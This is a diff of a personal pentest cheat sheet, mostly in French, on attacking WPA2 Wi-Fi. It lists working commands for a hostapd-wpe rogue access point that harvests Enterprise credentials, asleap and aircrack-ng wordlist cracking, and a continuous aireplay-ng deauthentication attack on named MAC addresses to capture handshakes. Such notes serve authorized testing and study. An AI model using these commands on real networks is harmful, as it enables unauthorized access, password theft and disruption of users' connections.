@@ -1,14 +1,18 @@
 -> Explications:
-Pour WPA2 Personnal utiliser airmon-ng car cela fonctionne avec une Pre Shared Key
-Pour WPA2 Entreprise utiliser Rogue AP (hostapd-wpe) car les informations d'authent se font en backroung entre l'AP et un server Radius par ex, et encrypté en TLS
+
+	Pour WPA2 Personnal utiliser airmon-ng car cela fonctionne avec une Pre Shared Key
+	Pour WPA2 Entreprise utiliser Rogue AP (hostapd-wpe) car les informations d'authent se font en backroung entre l'AP et un server Radius par ex, et encrypté en TLS
 
 [*] hostapd-wpe
 
 	Edit the SSID:
-		nano /etc/hostapd-wpe/hostapd-wpe.conf
+		-> nano /etc/hostapd-wpe/hostapd-wpe.conf
+
+	Run:
+		-> hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
 
 	Once a user connected to the Rogue AP:
-		zcat /usr/share/wordlists/rockyou.txt.gz | asleap -C [challenge] -R [response] -W -
+		-> zcat /usr/share/wordlists/rockyou.txt.gz | asleap -C [challenge] -R [response] -W -
 
 
 
@@ -23,12 +27,11 @@ Pour WPA2 Entreprise utiliser Rogue AP (hostapd-wpe) car les informations d'auth
 	On selectionne ensuite un SSID et un channel et on tape la commande:
 		airodump-ng -c 6 --bssid 5A:A9:D2:62:E3:03 -w /root/docs/pentest/ wlan0mon
 
-	Deconnecter un appareil du reseau pour recuperer le handshake:
-		aireplay-ng -0 10 -a 5A:A9:D2:62:E3:03  -c 54:99:63:C0:15:BF wlan0mon -w MyNameFile	(-a routeur -c appareil)
+	Deconnecter un appareil du reseau pour recuperer le handshake (basé sur le channel d'écoute d'airodump, ici 6):
+		aireplay-ng --deauth 0 -a 5A:A9:D2:62:E3:03  -c 54:99:63:C0:15:BF wlan0mon -w MyNameFile	(-a routeur -c appareil)
 
 	Une fois que le handshake est capture, on tente de trouver le mdp avec un dictionnaire:
 		aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/Documents/Pentest/-01.cap 
-
 
 
 [*] tcpdump
